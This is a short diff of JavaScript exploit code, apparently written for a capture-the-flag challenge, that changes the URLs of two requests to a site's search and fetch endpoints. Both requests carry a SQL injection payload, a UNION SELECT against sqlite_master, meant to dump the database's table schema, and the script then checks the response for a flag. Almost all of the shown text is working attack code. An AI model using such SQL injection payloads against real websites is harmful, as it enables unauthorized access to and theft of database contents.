@@ -19,7 +19,7 @@
       // 2. Try the search endpoint with SQLi
       try {
         const sqlQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
-        const searchResp = await fetch('https://nexus-security.club:8001/f/search?q=' + encodeURIComponent(sqlQuery));
+        const searchResp = await fetch('https://nexus-security.club/f/search?q=' + encodeURIComponent(sqlQuery));
         const searchData = await searchResp.text();
         alert('Search endpoint response length: ' + searchData.length);
         if (searchData.includes('_') && searchData.includes('flag_')) {
@@ -32,7 +32,7 @@
       try {
         const params = new URLSearchParams();
         params.append('q', "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --");
-        const fetchResp = await fetch('https://nexus-security.club:8001/fetch', {
+        const fetchResp = await fetch('https://nexus-security.club/fetch', {
           method: 'POST',
           body: params
         });
